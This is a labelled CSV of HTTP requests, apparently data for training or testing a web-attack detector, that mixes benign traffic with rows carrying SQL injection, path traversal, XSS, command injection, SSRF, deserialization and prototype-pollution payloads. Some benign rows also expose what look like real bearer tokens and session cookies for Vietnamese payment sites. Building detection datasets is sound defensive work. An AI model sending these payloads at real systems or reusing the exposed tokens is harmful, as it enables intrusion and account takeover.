method,path,query,headers,body,ua,label
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: ../../../../etc/passwd%00",,,1
POST,/chat/init,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
GET,/checkout,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
POST,/,,Authorization: Bearer token123,"{""name"": ""__import__('os').system('id')""}",,1
POST,/index.php,,Host: example.com; Accept: */*,input=' OR 'x'='x,Nmap Scripting Engine,1
POST,/search,,Host: example.com; Accept: */*,input=<script>alert(1)</script>,sqlmap/1.5.2,1
GET,/,,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
POST,/test-framework-api/node/node/sys-task/053cb910-a251-4683-883e-4d42ae1389c8/next-message/1770690762,,"Accept-Encoding: gzip, x-gzip, deflate; Authorization: Bearer eyJraWQiOiJMbHFRYVBsYXRmb3JtIiwiYWxnIjoiUlMyNTYifQ.eyJpc3MiOiJMbHFRYVBsYXRmb3JtIiwianRpIjoiNDRlM2FkNDAtZjk3MS00ZTIyLWExNzEtN2ZjZjdmYjZjMjg4Iiwic3ViIjoibGluaG5kMkB2bnBheS52biIsImVtYWlsIjoibGluaG5kMkB2bnBheS52biIsInRva2VuVHlwZSI6Ik5PREUifQ.DtYHgQvhdbidHrh2NhfmxUwW4U4FwTA9gA2XmRtCXOFmF7ml_cA7wRFQCcOzYBVmJs-OJZ5zLAnDXeOboK81N42VpuWCZOSob4EEO41x-lKqXweGduTAAwsHm4ZhQ73ms4_a0xD6hL11hX55vxoSGyz1NY45yFcDBr18D-8k9dJTEMkuzlZG16WdP7xJ61CYg9XaekXAmiatkSEs8GjzT7lVGF7Ls87Nbi6FkkHt-tr2o77uiGqfKqxNTRyJovNGYqjKk6gN3MCc1o-Qo9e2FotfSxWp3Bz8rERYNoE-JborCLv6Fjj-pHC1Spzadj5wwWbV12_NnlSVYyaT-_lKQg; Cache-Control: no-cache; Connection: keep-alive; Content-Length: 0; Cookie: __Host-grv_app_session_subject=f0bb13ae464b39453391cb6dc0d4e1e62eeb8857b39548344a1b93a559d46740; __Host-grv_app_session=67a4d64fcf1b4d31f0af98d4b868ef5528a1bb9f44dfc6f98df7751a6d938386; Host: lqa.vnpaytest.vn; Node-Version: v1.0.0; User-Agent: Apache-HttpClient/5.4.1 (Java/17.0.4.1); X-Request-Id: 7d631cfe-3121-4779-ab1d-019dec92401e",,Apache-HttpClient/5.4.1 (Java/17.0.4.1),0
GET,/,,Content-Type: application/json; Payload: ac ed 00 05 73 72 00 12 ...,,,1
PUT,/home,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
POST,/login,,Content-Type: application/x-www-form-urlencoded,user=test&pass=test,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
POST,/home,,Host: example.com; Accept: */*,username=user286&password=pass427,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/admin,q=' OR 'x'='x,Host: example.com; Accept: */*,,curl/7.68.0,1
GET,/feed/news.rss,,Content-Type: application/json,,,0
GET,/landing/may-loc-khong-khi-giam-15-trieu,_rsc=gzc64,"Accept: */*; Accept-Encoding: gzip, deflate, br; Accept-Language: vi-VN,vi;q=0.9; Connection: keep-alive; Cookie: _fbp=fb.1.1770767048087.703754281120309246; ttcsid=1770767047505::7v6rfOBMpJ1DpU64dKFS.1.1770767057977.0; ttcsid_CQNEHUJC77UD2I8MDM90=1770767047504::jc34THiALoJhcqJqToJX.1.1770767057976.1; ttcsid_CQQA2PJC77U11VCBE7G0=1770767047505::iizIIqXZ4JpfRSOvYoI3.1.1770767057517.1; _ga=GA1.1.309676274.1770767047; _ga_1XRVJ9DDS6=GS2.1.s1770767047$o1$g0$t1770767047$j60$l0$h0; _gcl_au=1.1.1495596680.1770767047; _tt_enable_cookie=1; _ttp=01KH4Z1PTE0J4X91DXSBK3Z93H_.tt.1; Host: sacombankpay.vnshop.vn; Next-Router-Prefetch: 1; Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22100_shop%22%2C%7B%22children%22%3A%5B%5B%22merchant%22%2C%22vnshop%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%5B%22channel%22%2C%22CH1003%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%5B%22subchannel%22%2C%22970430%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%5B%22locale%22%2C%22vi%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%22(navigation)%22%2C%7B%22children%22%3A%5B%5B%22slug%22%2C%22%22%2C%22oc%22%5D%2C%7B%22children%22%3A%5B%22__PAGE__%3F%7B%5C%22data%5C%22%3A%5C%22YZ4tLo5X8ftsDhWADlVYlrr3T6E9MHoHuedWXdjKSZ0IWdcg56bODlyt6SreiSr3DpDjhgwqxcIOTx%2BDX4lAhViLfFpetRy1ByYDGqyn%2F5a%2Bc9tE3mD7ZXNBF5I2p6Zq%2F720s4%2BggfodcSn9FUOPlpGhRkkrK7IuUOubokuZ5IA9VIt36dOXZcmIXbF4YIRAMtGqdBUkgzPDudDrSAHYkuMHor0XHX0WDJyw29U9BtZe0hKNm31izTZheZTcCjAGAYUsXGxGWVlaPvmAI2iZHzmGiQRNCE5dqYOOo1rU5u%2BugMjUDLwdqW%2F1FYAeZS9KovxyS8wF4xamToLHuE8kJbQM9jVNrXllYPczE8LoitYeXPpx%2BWtGIWoL1WV5Ak2Kumry8tIzIbY6FU7CeVvJ5zwKehw6hhhdtCxJxPpPn467z6MJbaFb6t2CBIeZY7R3eR2QGIPEtOOzL3hsFbwtFDqoONQfOWiZ%2FSRpX1V6iENX4OntYwZCYQz8YBYEToQT4lrnHTrgPIzQiwSvo26nQkN4LgSpd4B7GdISyDTQK%2BwDO8AoaJBwumwaQtlJFPexWgXAJcqLC0h3Yt0%2Ft7PfLaW3Tl23T1iFQtB6PtzlMaPPK8q7N7J8jDmKdckSZ4YP7gs0OfK6%2FTa15vXjlPkcQM6nAG4cMIhDLsAw2tllF824eUynyS19LO8Zkfu1iwjkrvVyJOLUkK81npfZwFYWebO2htTj55udFlbTLSkSOjlutxONK9E%2BdFZtjfnFzpdqgOMmSvc76WMCySTZC6yYJsAQ8vaDb4aRY1%2FgJ06FkBEehCy%2Bu%2BdjuZzbgJb669ZgzqKOUa98OXUPRoArTz1hHtO4WzKIH11SbFTGtHerM0aGbWn%2FNVvKNJ9LkfaZwksQjKTWPFxtOSlgHkZjLGOdO3QqSCIIiZQGVfGKcZp9%2BwLaLIjK%2F%2BkkrZzXNscseySp%5C%22%2C%5C%22lang%5C%22%3A%5C%22vi%5C%22%2C%5C%22b%5C%22%3A%5C%22970430%5C%22%2C%5C%22timestamp%5C%22%3A%5C%221770767045585%5C%22%7D%22%2C%7B%7D%5D%7D%5D%7D%5D%7D%5D%7D%5D%7D%5D%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D; Next-Url: /100_shop/vnshop/CH1003/970430/vi; Referer: https://sacombankpay.vnshop.vn/?data=YZ4tLo5X8ftsDhWADlVYlrr3T6E9MHoHuedWXdjKSZ0IWdcg56bODlyt6SreiSr3DpDjhgwqxcIOTx%2BDX4lAhViLfFpetRy1ByYDGqyn%2F5a%2Bc9tE3mD7ZXNBF5I2p6Zq%2F720s4%2BggfodcSn9FUOPlpGhRkkrK7IuUOubokuZ5IA9VIt36dOXZcmIXbF4YIRAMtGqdBUkgzPDudDrSAHYkuMHor0XHX0WDJyw29U9BtZe0hKNm31izTZheZTcCjAGAYUsXGxGWVlaPvmAI2iZHzmGiQRNCE5dqYOOo1rU5u%2BugMjUDLwdqW%2F1FYAeZS9KovxyS8wF4xamToLHuE8kJbQM9jVNrXllYPczE8LoitYeXPpx%2BWtGIWoL1WV5Ak2Kumry8tIzIbY6FU7CeVvJ5zwKehw6hhhdtCxJxPpPn467z6MJbaFb6t2CBIeZY7R3eR2QGIPEtOOzL3hsFbwtFDqoONQfOWiZ%2FSRpX1V6iENX4OntYwZCYQz8YBYEToQT4lrnHTrgPIzQiwSvo26nQkN4LgSpd4B7GdISyDTQK%2BwDO8AoaJBwumwaQtlJFPexWgXAJcqLC0h3Yt0%2Ft7PfLaW3Tl23T1iFQtB6PtzlMaPPK8q7N7J8jDmKdckSZ4YP7gs0OfK6%2FTa15vXjlPkcQM6nAG4cMIhDLsAw2tllF824eUynyS19LO8Zkfu1iwjkrvVyJOLUkK81npfZwFYWebO2htTj55udFlbTLSkSOjlutxONK9E%2BdFZtjfnFzpdqgOMmSvc76WMCySTZC6yYJsAQ8vaDb4aRY1%2FgJ06FkBEehCy%2Bu%2BdjuZzbgJb669ZgzqKOUa98OXUPRoArTz1hHtO4WzKIH11SbFTGtHerM0aGbWn%2FNVvKNJ9LkfaZwksQjKTWPFxtOSlgHkZjLGOdO3QqSCIIiZQGVfGKcZp9%2BwLaLIjK%2F%2BkkrZzXNscseySp&lang=vi&b=970430&timestamp=1770767045585; Rsc: 1; Sec-Fetch-Dest: empty; Sec-Fetch-Mode: cors; Sec-Fetch-Site: same-origin; User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)",,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)",0
GET,/api/v1/locale/set,lang=en,Authorization: Bearer token123,,,0
GET,/,,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/PhpSpreadsheet/Writer/PDF/DomPDF.php,input_file=php://filter/resource=/etc/passwd,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/601.5.13 (KHTML, like Gecko) Version/9.1.2 Safari/601.5.13",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/601.5.13 (KHTML, like Gecko) Version/9.1.2 Safari/601.5.13",1
GET,/help/kb/search,query=how+to+reset+password,Authorization: Bearer token123,,,0
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: //////////////////etc/passwd",,,1
GET,/,,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: `uname -a`",,,1
POST,/careers/apply,,Authorization: Bearer token123,,,0
GET,/api/v1/dashboard/widgets/sales-chart/data,,Content-Type: application/json,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: ..\..\..\..\windows\system32\config\sam",,,1
GET,/,,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
PUT,/api/v1/users,,Host: example.com; Accept: */*,input=http://169.254.169.254/latest/meta-data,curl/7.68.0,1
DELETE,/,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/search,q=<img src=x onerror=alert(1)>,Host: example.com; Accept: */*,,Nmap Scripting Engine,1
POST,/login,,Content-Type: application/x-www-form-urlencoded,user=test&pass=test,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,Content-Type: application/json; Payload: PATCH /api/v1/settings/theme,,,0
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: dict://localhost:11211/stat",,,1
GET,/,,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
POST,/webhooks/github,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
GET,/products/ao-tshirt-bb-kamito-ruba-s-xanh-bich-ID130240,sku-route-history=categoryPage_BASIC_CATEGORY_MENU&_rsc=l8zu0,"Accept: */*; Accept-Encoding: gzip, deflate, br; Accept-Language: en-US,en;q=0.9; Connection: keep-alive; Cookie: _fbp=fb.1.1771646706689.507032031291673611; ttcsid=1771646706558::Iy5Pw9gim1Q1Z-hDTy4i.1.1771646757368.0; ttcsid_CQNEHUJC77UD2I8MDM90=1771646706558::veeNfKVppt8Ofx2fdzsb.1.1771646757366.1; ttcsid_CQQA2PJC77U11VCBE7G0=1771646706559::e6tbUOeGj7wcT3bUqsCy.1.1771646757368.1; _ga_1XRVJ9DDS6=GS2.1.s1771646706$o1$g1$t1771646749$j17$l0$h0; _ga=GA1.1.241616279.1771646706; _gcl_au=1.1.1635132424.1771646706; _tt_enable_cookie=1; _ttp=01KHZ5YRVS4DY2Q0G6X0V41PEN_.tt.1; Host: bidvmb.vnshop.vn; Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22100_shop%22%2C%7B%22children%22%3A%5B%5B%22merchant%22%2C%22vnshop%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%5B%22channel%22%2C%22CH1005%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%5B%22subchannel%22%2C%22970418%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%5B%22locale%22%2C%22vi%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%22(product)%22%2C%7B%22children%22%3A%5B%22products%22%2C%7B%22children%22%3A%5B%5B%22slug%22%2C%22ao-tshirt-bb-kamito-ruba-s-xanh-bich-ID130240%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D%7D%5D%7D%5D%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D; Next-Url: /100_shop/vnshop/CH1005/970418/vi/products/ao-tshirt-bb-kamito-ruba-s-xanh-bich-ID130240; Referer: https://bidvmb.vnshop.vn/products/ao-tshirt-bb-kamito-ruba-s-xanh-bich-ID130240; Rsc: 1; Sec-Fetch-Dest: empty; Sec-Fetch-Mode: cors; Sec-Fetch-Site: same-origin; User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)",,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)",0
GET,/upload/mobile/index.php,"c=category&a=asynclist&price_max=1.0%20AND%20(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT(0x7e,md5(999999999),0x7e,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)''",Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0,,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0,1
GET,/,,Authorization: Bearer token123; Payload: HEAD /assets/large-video.mp4,,,0
GET,/products,,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
POST,/login,,Content-Type: application/x-www-form-urlencoded,user=test&pass=test,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
POST,/privacy/consent,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
PUT,/api/v1/orders,,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/auth/google/callback,,Content-Type: application/json,,,0
GET,/,php://filter/convert.base64-encode/resource=index.php,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,1
GET,/products/dau-goi-gung-ha-thu-o-kich-moc-toc-weilaiya-zingiber-officinale-juice-bright-hair-shampoo-400ml-ID104298,_rsc=b8z6i,"Accept: */*; Accept-Encoding: gzip, deflate, br, zstd; Accept-Language: vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7; Connection: keep-alive; Cookie: _tt_enable_cookie=1; _ttp=01KHTFVH21ZNMA81S6KA7YEY0J_.tt.1; _fbp=fb.1.1771489314353.556020615881484191; _gcl_au=1.1.253168329.1771489316; _ga=GA1.1.1504524048.1771489316; _ga_1XRVJ9DDS6=GS2.1.s1771489316$o1$g1$t1771489575$j19$l0$h0; ttcsid_CQQA2PJC77U11VCBE7G0=1771489313881::3wQxWlJNo0xt_Cqt6DKz.1.1771489676280.1; ttcsid_CQNEHUJC77UD2I8MDM90=1771489313878::x8oHa60xiUS4rL-DJ-N8.1.1771489676394.1; ttcsid=1771489313880::GyTGBq-JvIKvIjcvrfFX.1.1771489676394.0; Host: bidvmb.vnshop.vn; Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22products%22%2C%7B%22children%22%3A%5B%22dau-goi-gung-ha-thu-o-kich-moc-toc-weilaiya-zingiber-officinale-juice-bright-hair-shampoo-400ml-ID104298%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%2Cnull%2C%22refetch%22%5D%7D%2Cnull%2Cnull%2Ctrue%5D; Next-Url: /100_shop/vnshop/CH1005/970418/vi/auth/vnpay/login; Referer: https://bidvmb.vnshop.vn/auth/vnpay/login?data=OltZJE7ZaPSLmXQJ5%2FpwgCMm%2FkvonsDJ8VufIIbd%2Fnmagf1o7yuQJf7pEDMQ1Mbkso8IWbAyJUlgxsZFzUs5uL2fKjAf%0ANZ0JHAOQ9nOkouceSYd%2FZW8vMfYP%2BxpjL9X5d6V%2BX9C71AKGM4qCQZGf1xx%2FHH%2Bzp%2BTEuMsccpb4%0AzCrbyQ5LIYXDROtb3EqD5%2Be%2FEtpGmkHVg1iKhNvIeRHMZyCbMWompNiwe%2FdE3u97DsLQPrtSmNrl%0AO%2BwQ4p2v0ullDqIFzTd6iuOwaaDPNHu3fOlyNYA6HduF2sc9DVwny42ymKLyQ1rzgg1IpDXG%2FeKs%0AMwHnqHdQ3KG6C0w%3D%0A&signature=3583C92A08BC789B56EE093298F6FAA805308C8D971032410E763F97183473AC; Rsc: 1; Sec-Ch-Ua: ""Not(A:Brand"";v=""8"", ""Chromium"";v=""144"", ""Android WebView"";v=""144""; Sec-Ch-Ua-Mobile: ?1; Sec-Ch-Ua-Platform: ""Android""; Sec-Fetch-Dest: empty; Sec-Fetch-Mode: cors; Sec-Fetch-Site: same-origin; User-Agent: Mozilla/5.0 (Linux; Android 16; V2453A Build/BP2A.250605.031.A3_V000L1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36; X-Requested-With: com.vnpay.bidv",,"Mozilla/5.0 (Linux; Android 16; V2453A Build/BP2A.250605.031.A3_V000L1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36",0
GET,/homess,,Content-Type: application/json,,,0
DELETE,/api/v1/users,,Host: example.com; Accept: */*,input=' OR 1=1--,Nmap Scripting Engine,1
POST,/login,,Content-Type: application/x-www-form-urlencoded,user=test&pass=test,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/search,q=laptop,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
DELETE,/admin,,Host: example.com; Accept: */*,"input=' UNION SELECT NULL,NULL--",Nikto/2.1.6,1
DELETE,/home,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/favicon.ico,,,,,0
GET,/checkout,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/,,Content-Type: application/json,,,0
POST,/user/ui/theme,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
POST,/chat/init,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: %0d%0aSet-Cookie: session=attacker",,,1
GET,/search,q=laptop,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
POST,/user/password-update,,Content-Type: application/json,,,0
GET,/,,Authorization: Bearer token123; Payload: ${os.system('id')},,,1
GET,/,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: cos\nsystem\n(S'id'\ntR.",,,1
GET,/admin/users,limit=20&offset=40,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
GET,/search,q=machine+learning+NOT+python,Content-Type: application/json,,,0
POST,/,,Content-Type: application/json,{{constructor.constructor('alert(1)')()}},,1
GET,/home,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/,,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
POST,/admin,,Host: example.com; Accept: */*,input=../../../../etc/passwd,curl/7.68.0,1
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: query { __schema { types { name } } }",,,1
POST,/newsletter/subscribe,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
GET,/servlet/sduty/getSdutyTree,param=child&target=1&codesetid=1&codeitemid=1%27+UNION+ALL+SELECT+NULL%2CCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28119%29%2BCHAR%2885%29%2BCHAR%2873%29%2BCHAR%2887%29%2BCHAR%2899%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2872%29%2BCHAR%28113%29%2BCHAR%28104%29%2BCHAR%28107%29%2BCHAR%2889%29%2BCHAR%28115%29%2BCHAR%28108%29%2BCHAR%2873%29%2BCHAR%2884%29%2BCHAR%2869%29%2BCHAR%2873%29%2BCHAR%2875%29%2BCHAR%2883%29%2BCHAR%2898%29%2BCHAR%28116%29%2BCHAR%28120%29%2BCHAR%2889%29%2BCHAR%2884%29%2BCHAR%2882%29%2BCHAR%28120%29%2BCHAR%2884%29%2BCHAR%28116%29%2BCHAR%2888%29%2BCHAR%28112%29%2BCHAR%2887%29%2BCHAR%2873%29%2BCHAR%28109%29%2BCHAR%28104%29%2BCHAR%2887%29%2BCHAR%28102%29%2BCHAR%2897%29%2BCHAR%2877%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28106%29%2BCHAR%28122%29%2BCHAR%28113%29%2CNULL%2CNULL--+Iprd,"Accept-Encoding: gzip; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.8 Safari/605.1.15",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.8 Safari/605.1.15",1
GET,/favicon.ico,,Content-Type: application/json,,,0
GET,/,,"Content-Type: application/json; Payload: id=1' AND 1=CONVERT(int, (SELECT password FROM users LIMIT 0,1))--",,,1
PUT,/login,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/search,q=laptop,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/manifest.json,,Content-Type: application/json,,,0
GET,/,,Authorization: Bearer token123; Payload: %0als,,,1
GET,/api/v1/products/101,,Content-Type: application/json,,,0
PUT,/login,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
POST,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","{""__proto__"": {""isAdmin"": true}}",,1
GET,/maps/v2/tile/10/512/324.png,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
PUT,/api/v1/users,,Host: example.com; Accept: */*,input=admin'--,Nikto/2.1.6,1
GET,/auth/google/callback,,Content-Type: application/json,,,0
PUT,/,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
POST,/,,Content-Type: application/json,"{""alg"":""RS256"",""kid"":""../../../../dev/null"",""typ"":""JWT""}",,1
PUT,/,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
POST,/login,,Content-Type: application/x-www-form-urlencoded,user=test&pass=test,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
DELETE,/search,,Host: example.com; Accept: */*,input=..\..\..\windows\system32,Nikto/2.1.6,1
POST,/graphql,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
PUT,/login,,Host: example.com; Accept: */*,input=' OR 1=1--,Nikto/2.1.6,1
